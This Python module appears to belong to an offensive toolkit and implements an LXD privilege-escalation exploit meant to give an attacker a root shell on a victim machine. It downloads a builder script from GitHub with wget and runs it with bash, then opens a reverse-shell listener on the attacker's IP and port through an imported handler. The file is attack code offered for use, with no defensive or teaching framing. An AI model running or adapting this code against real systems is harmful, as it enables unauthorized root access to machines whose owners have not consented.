import os, time, re
import sys
from Privilege_Escalation_LXD.rev_shell_handler import listen_shell
# This Exploit uses a vulnerability in the LXD software in order to spawn a root shell

# The exploit requires action in both the attacking and victim machine

def get_file_name():
	files = os.listdir(os.curdir)
	for file in files:
		# search given pattern in the line 
		match = re.search('alpine-.*\.tar\.gz$', file)
		# if match is found
		if match:
			return file
	return None

def run(victim_info, attacker_info, general_info, arguments, rep):

	a_ip = attacker_info['ip']
	a_port = attacker_info['port']
	v_ip = victim_info['ip']
	v_port = victim_info['port']
	
	# Dont print Banners if it's on repeat mode
	if arguments.repeat == None:
		print('''
		##################################################################################
		#										 #
		# 			    LXD PRIVILEGE ESCALATION 				 #		
		#										 #
		##################################################################################
		''')
	
	print('[*] Getting Alpine Builder')
	if not ( os.path.exists('./build-alpine')):
		cmd = '''
		wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
		bash build-alpine
		'''
		os.system(cmd)
		time.sleep(0.2)
		if not os.path.exists('./build-alpine'):
			sys.exit('Something went wrong, build-alpine not detected') 
	elif get_file_name() == None:
		print('[*] We detected that you already have an build-alpine file but not the alpine.tar.gz')
		cmd = '''bash build-alpine'''
		os.system(cmd)
	else:
		pass
	
	print('[*] Opening Reverse Shell on: {ip}:{port}'.format(ip=a_ip, port=a_port))
	listen_shell(a_ip, a_port, v_ip, v_port, general_info, arguments, victim_info['secure'] == 'True', rep)
	print('#################### REP = ', rep)
	if rep == 0:	
		sys.exit('Exiting...')
	
